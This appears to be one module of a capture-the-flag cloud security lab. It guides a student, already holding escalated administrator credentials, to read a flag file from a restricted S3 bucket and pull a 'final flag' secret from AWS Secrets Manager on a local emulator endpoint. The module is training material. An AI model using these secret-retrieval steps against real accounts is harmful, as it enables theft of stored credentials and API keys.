# Module 5: Corporate Secrets Infiltration

## Objective
Retrieve the final flag from AWS Secrets Manager using your escalated Administrator credentials.

## Background
AWS Secrets Manager is a secure repository designed to hold database credentials, API keys, and sensitive tokens. Once an attacker obtains Administrator credentials, they can compromise the entire secrets vault.

## Steps to Solve
1. Check the restricted S3 bucket to inspect `flag5.txt`:
   ```bash
   aws s3 cp s3://[your-restricted-bucket-name]/flag5.txt - --endpoint-url http://10.20.0.10:4566
   ```
2. You will find a note indicating that the final flag has been relocated to AWS Secrets Manager under the secret ID `company/final/flag`.
3. Retrieve the secret value using the Secrets Manager API:
   ```bash
   aws secretsmanager get-secret-value --secret-id "company/final/flag" --endpoint-url http://10.20.0.10:4566
   ```
4. Extract the final flag (`flag{final_loot_xxxx}`) from the JSON response and submit it to finish the lab room!
